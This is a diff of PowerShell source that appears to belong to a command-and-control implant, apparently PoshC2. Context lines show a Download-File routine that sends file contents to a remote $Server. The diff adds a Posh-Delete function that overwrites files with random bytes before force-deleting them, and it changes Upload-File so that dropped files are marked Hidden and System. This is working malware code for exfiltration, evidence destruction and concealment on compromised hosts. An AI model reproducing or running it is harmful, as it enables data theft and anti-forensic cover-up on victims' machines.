@@ -400,6 +400,23 @@ function Download-File
         (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
     }
 }
+function Posh-Delete
+{
+    param
+    (
+        [string] $Destination
+    )
+    try {
+    $file = Get-Item $Destination -Force
+    $file.Attributes = "Normal"
+    $content = New-Object Byte[] $file.length 
+    (New-Object Random).NextBytes($content)
+    [IO.File]::WriteAllBytes($file,$content)
+    Remove-Item $Destination -Force
+    } catch {
+    echo $error[0]
+    }
+}
 function Upload-File 
 {
     param
@@ -407,10 +424,17 @@ function Upload-File
         [string] $Base64,
         [string] $Destination
     )
+    try {
     write-output "Uploaded file to: $Destination"
     $fileBytes = [Convert]::FromBase64String($Base64)
     [io.file]::WriteAllBytes($Destination, $fileBytes)
-                
+    $file = Get-Item $Destination -Force
+    $attrib = $file.Attributes
+    $attrib = "Hidden,System"
+    $file.Attributes = $attrib  
+    } catch {
+    echo $error[0]
+    }  
 }
 function Resolve-PathSafe
 {
